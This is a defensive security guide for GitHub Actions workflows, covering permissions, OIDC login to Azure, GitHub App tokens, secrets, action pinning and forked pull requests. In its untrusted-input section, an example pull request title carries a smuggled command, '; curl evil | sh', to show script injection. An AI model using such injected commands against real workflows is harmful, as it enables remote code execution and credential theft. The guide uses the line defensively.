---
paths:
  - ".github/workflows/**"
  - ".github/actions/**"
  - "**/action.yml"
  - ".github/dependabot.yml"
---

# Workflow security

A workflow runs with credentials that can deploy to production. Treat its YAML like production code.

## Permissions

```yaml
permissions:
  contents: read          # the default for the whole workflow

jobs:
  deploy:
    permissions:
      contents: read
      id-token: write     # only the job that logs in to Azure
```

Each job asks only for what it uses. A job that only reads never gets `contents: write`.

## Azure: OIDC only

- `azure/login` with the identity's client, tenant and subscription ids, and `id-token: write`. No client secrets, no
  publish profiles, no `az acr credential show`.
- One identity per environment, federated only for that GitHub Environment, so a dev job can't touch production.
- Rights on named resources, never Contributor on a whole resource group.

## Untrusted input

Values that come from users (pull request titles and bodies, branch names, issue and comment text) are attacker
input. In `run:`, `${{ … }}` is pasted into the script before it runs:

```yaml
# ✗ a title like  "; curl evil | sh"  runs
- run: echo "${{ github.event.pull_request.title }}"

# ✓ through the environment, quoted
- env:
    TITLE: ${{ github.event.pull_request.title }}
  run: echo "$TITLE"
```

## Another repo or the GitHub API: a GitHub App

`GITHUB_TOKEN` reaches only its own repo. For anything else (checking out a private repo, the API on another repo), use
a **GitHub App** owned by the organization, never a personal access token (PAT):

- A PAT belongs to a person. It breaks when they leave or lose access, it expires on its own date, and it can do
  whatever that person can.
- An App is installed only on the repos it needs, with the fewest permissions (e.g. Contents: read). Each job mints a
  token that lasts an hour and is revoked when the job ends.

```yaml
# ✗ a person's token, valid for a year
- uses: actions/checkout@<sha> # vX
  with:
    repository: org/lib
    token: ${{ secrets.LIB_PAT }}

# ✓ an App token: only that repo, read-only, gone when the job ends
- id: token
  uses: actions/create-github-app-token@<sha> # vX
  with:
    client-id: ${{ vars.LIB_APP_CLIENT_ID }}
    private-key: ${{ secrets.LIB_APP_PRIVATE_KEY }}
    repositories: lib
    permission-contents: read
- uses: actions/checkout@<sha> # vX
  with:
    repository: org/lib
    token: ${{ steps.token.outputs.token }}
    persist-credentials: false
```

- Creating the App, once: organization → Developer settings → GitHub Apps → New. Turn the webhook off, grant only the
  permissions it needs, and make it installable only on this account. Install it on the repos it reads.
- Store its client ID as a variable and its private key as a secret, set from the file (`gh secret set … < key.pem`)
  so the key never appears on a command line. Then delete the `.pem`.
- Used in several jobs, wrap the two steps in a local composite action. With `checkout … path: <dir>`, call it as
  `./<dir>/.github/actions/…`: local actions resolve from the workspace. actionlint can't catch a wrong path, so run
  the workflow once. A reusable workflow can't call a local action of its own repo: share the steps between its jobs
  with YAML anchors (`- &token …`, then `- *token`), scoped per job through a job `env:` value.
- Dependabot can't use the App. For it to update references to a private repo (reusable workflows, actions), grant it
  access to that repo in the organization's Advanced Security settings.

## Secrets

- From `secrets` into the `env:` of the one step that needs them, or into an action's `with:` input.
- Never on a command line (other processes on the runner can read it), in `$GITHUB_ENV`, in an artifact or in a build
  argument.
- `actions/checkout` with `persist-credentials: false` unless the job pushes.
- A secret that appeared in a log is compromised: rotate it.

## Pinning

- **Our template**: its release tag (`@v3.0.0`), which a ruleset protects from moving.
- **Third-party actions**: a full commit SHA, with the version in a comment, because a tag can be moved to new code:

  ```yaml
  - uses: actions/checkout@<full 40-character commit sha>   # v5.0.0
  ```

- Dependabot updates the actions (`package-ecosystem: github-actions`), SHA pins included.
- Check an action's current version and source before adding it; never copy a pinned version from an old document.
- A new third-party action is a decision: it runs with the job's credentials.

## Pull requests from outside

- No `pull_request_target` that checks out or runs the pull request's code: it runs with the repo's secrets.
- Self-hosted runners only for trusted code (merges, tags, approved runs), never for pull requests from forks.

## Running safely

- `timeout-minutes` on every job.
- `concurrency` on deploy workflows (`group: deploy-${{ inputs.environment }}`, `cancel-in-progress: false`), so a
  deploy is never cancelled halfway.
- Tags are written by the pipeline, through the API, after a healthy deploy. Never by hand.
